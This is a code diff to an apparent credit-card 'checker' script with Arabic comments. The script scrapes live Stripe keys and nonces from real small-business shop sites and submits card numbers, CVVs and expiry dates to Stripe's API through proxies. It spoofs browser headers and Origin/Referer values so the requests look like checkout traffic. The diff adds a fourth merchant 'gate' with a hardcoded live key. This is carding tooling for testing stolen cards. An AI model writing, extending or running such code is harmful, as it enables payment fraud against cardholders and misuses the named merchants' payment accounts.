@@ -616,25 +616,35 @@ def check_card_on_site(card_str, site_url, proxy=None):
         html = resp.text
         pk_m     = re.search(r'pk_live_[a-zA-Z0-9]+', html)
         nonce_m  = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
-        if not pk_m or not nonce_m:
+
+        # دعم PK ثابت من إعدادات البوابة (fallback لو مش موجود في الصفحة)
+        gate_config = next((g for g in GATES.values() if g['site'] == site_url), {})
+        pk_key = (pk_m.group(0) if pk_m else None) or gate_config.get('pk')
+
+        if not pk_key or not nonce_m:
             return "GATE_DOWN", "تعذر استخراج مفاتيح Stripe (فشل التسجيل أو البوابة تغيرت)"
+
+        # Origin يكون domain الموقع — Stripe يتحقق منه مع الـ PK
+        stripe_origin  = gate_config.get('stripe_referer', f"{site_url}/my-account/add-payment-method/")
+        from urllib.parse import urlparse as _urlparse
+        _p = _urlparse(stripe_origin)
+        stripe_origin_domain = f"{_p.scheme}://{_p.netloc}"
 
         stripe_data = {
             'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
             'card[exp_month]': month, 'card[exp_year]': year[-2:],
-            'key': pk_m.group(0),
+            'key': pk_key,
             'payment_user_agent': 'stripe.js/v3; stripe-js-v3/5.0.0',
             'time_on_page': str(random.randint(30000, 90000)),
-            'referrer': f"{site_url}/my-account/add-payment-method/",
+            'referrer': stripe_origin,
         }
         resp   = session.post("https://api.stripe.com/v1/payment_methods",
                               data=stripe_data,
                               headers={
                                   'Content-Type': 'application/x-www-form-urlencoded',
-                                  'Origin': 'https://js.stripe.com',
-                                  'Referer': 'https://js.stripe.com/',
+                                  'Origin': stripe_origin_domain,
+                                  'Referer': stripe_origin,
                                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-                                  'Stripe-Version': '2024-06-20',
                                   'Accept': 'application/json',
                               },
                               proxies=proxy_dict, timeout=25)
@@ -761,7 +771,10 @@ def check_card_with_retry(card_str, site_url):
 GATES = {
     '1': {'name': '🏦 بوابة 1', 'site': 'https://copenhagensilver.com'},
     '2': {'name': '💳 بوابة 2', 'site': 'https://www.spokaneshirtco.com'},
-    '3': {'name': '🔥 بوابة 3', 'site': 'https://www.4allpromos.com'}
+    '3': {'name': '🔥 بوابة 3', 'site': 'https://www.4allpromos.com'},
+    '4': {'name': '🔑 بوابة 4', 'site': 'https://www.hornbakersrepairandwelding.com',
+          'pk': 'pk_live_zGPdg7zDlr9xTBUdMWEMoZxJ',
+          'stripe_referer': 'https://www.hornbakersrepairandwelding.com/checkout/'},
 }
 
 def get_bin_info(bin6):
